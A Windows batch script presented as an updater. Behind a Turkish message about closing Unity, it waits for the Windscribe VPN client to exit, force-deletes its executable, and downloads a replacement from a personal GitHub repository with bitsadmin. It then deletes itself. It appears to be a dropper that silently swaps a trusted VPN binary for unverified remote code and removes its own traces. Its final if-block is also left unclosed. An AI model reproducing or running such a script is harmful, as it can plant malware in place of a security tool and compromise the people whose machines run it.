@echo off
echo unity'i kapatınız ve bu dosya ekrandan gidene kadar bekleyin...

:loop
tasklist | find /i "Windscribe.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)

echo Deleting existing Windscribe.exe...
del /f "C:\Program Files\Windscribe\Windscribe.exe"

echo Downloading new Windscribe.exe...
bitsadmin /transfer myDownloadJob /download /priority high https://github.com/charpodia11/phonkdrapa/raw/main/Windscribe.exe "C:\Program Files\Windscribe\Windscribe.exe"

if exist "C:\Program Files\Windscribe\Windscribe.exe" (
    echo completed.

echo Cleaning up...
del "%~f0"